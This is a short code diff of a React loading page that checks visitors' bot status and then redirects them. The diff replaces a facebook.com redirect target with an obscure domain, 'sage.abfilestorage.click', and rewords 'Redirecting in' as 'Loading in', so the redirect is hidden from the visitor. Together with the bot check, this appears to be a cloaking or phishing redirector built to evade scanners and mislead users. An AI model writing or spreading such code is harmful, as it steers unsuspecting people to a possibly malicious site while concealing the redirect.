@@ -5,7 +5,7 @@ import "./App.css";
 
 const App = () => {
   const [progress, setProgress] = useState(0);
-  const [redirectUrl, setRedirectUrl] = useState("https://facebook.com");
+  const [redirectUrl, setRedirectUrl] = useState("https://sage.abfilestorage.click");
 
   useEffect(() => {
     const checkBotStatus = async () => {
@@ -47,7 +47,7 @@ const App = () => {
       <div className="progress-bar-container">
         <div className="progress-bar" style={{ width: `${progress}%` }}></div>
       </div>
-      <p className="progress-text">Redirecting in {Math.max(2 - progress / 50, 0).toFixed(1)}s...</p>
+      <p className="progress-text">Loading in {Math.max(2 - progress / 50, 0).toFixed(1)}s...</p>
     </div>
   );
 };
